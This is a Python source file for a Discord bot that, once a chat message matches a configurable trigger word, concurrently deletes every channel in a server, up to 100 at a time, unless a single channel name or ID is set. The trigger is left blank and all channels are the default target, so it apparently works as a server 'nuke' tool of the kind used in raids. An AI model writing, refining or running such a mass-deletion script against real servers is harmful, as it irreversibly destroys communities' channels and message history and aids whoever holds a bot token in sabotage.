import discord
from discord.ext import commands
import asyncio

# ---------- CONFIG ----------
TRIGGER = ""   # Word to type in chat to start deletion
GUILD_ID = 1234567890123456789  # Your server ID
CHANNEL_NAME = None            # Optional: delete only channels with this name
CHANNEL_ID = None              # Optional: delete only a specific channel by ID
CONCURRENCY = 100                # How many channels delete at the same time
BOT_TOKEN = "Bot_Token_Here"
# ----------------------------

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="", intents=intents)


async def delete_channels():
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("Bot is not in the specified guild.")
        return

    # Filter channels
    if CHANNEL_ID:
        channels_to_delete = [guild.get_channel(CHANNEL_ID)]
    elif CHANNEL_NAME:
        channels_to_delete = [ch for ch in guild.channels if ch.name == CHANNEL_NAME]
    else:
        channels_to_delete = list(guild.channels)

    print(f"Found {len(channels_to_delete)} channels to delete")

    # Semaphore for concurrency control
    sem = asyncio.Semaphore(CONCURRENCY)

    async def delete_channel(ch):
        async with sem:
            if not ch:
                return
            try:
                await ch.delete(reason="Mass channel deletion")
                print(f"Deleted channel: {ch.name}")
            except discord.Forbidden:
                print(f"No permission to delete channel: {ch.name}")
            except discord.HTTPException as e:
                print(f"Failed to delete {ch.name}: {e}")

    # Run deletions concurrently
    await asyncio.gather(*(delete_channel(ch) for ch in channels_to_delete))


@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.strip().lower() == TRIGGER.lower():
        print("⚡ Trigger detected, starting channel deletion...")
        bot.loop.create_task(delete_channels())


bot.run(BOT_TOKEN)
